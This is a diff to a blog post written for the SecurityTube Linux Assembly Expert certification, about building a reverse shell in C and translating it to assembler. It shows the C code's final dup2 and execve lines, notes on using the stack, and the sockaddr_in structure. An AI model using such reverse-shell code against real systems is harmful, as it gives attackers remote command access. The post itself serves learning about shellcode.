@@ -138,14 +138,17 @@ dup2(client_sock, 2); // STDERR
 execve(arguments[0], &arguments[0], NULL);
 {{</ highlight >}}
 
-At this point we're good to go.
+That completes the functionality of the reverse shell in C. Now we need to convert it to Assembler.
 
 ### Translating The Code to Assembler
 
+There are quite a few variables and structures to deal with in this code. Far more than can be managed by using registers for storage. 
 
+We'll use the stack to hold some local variables. Rather than having single use variables, we'll reuse the addresses to keep things small and simple.
 
 The sockaddr_in structure is described in netinet/in.h
 
+{{< highlight c >}}
 struct sockaddr_in {
     short            sin_family;   // 2 Bytes. e.g. AF_INET (2)
     unsigned short   sin_port;     // 2 Bytes. Network order.
@@ -156,6 +159,9 @@ struct sockaddr_in {
 struct in_addr {
     unsigned long s_addr;  // 4 bytes.
 };
+{{</ highlight >}}
+
+This is 16 bytes that we'll place on the stack first
 
 This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
 
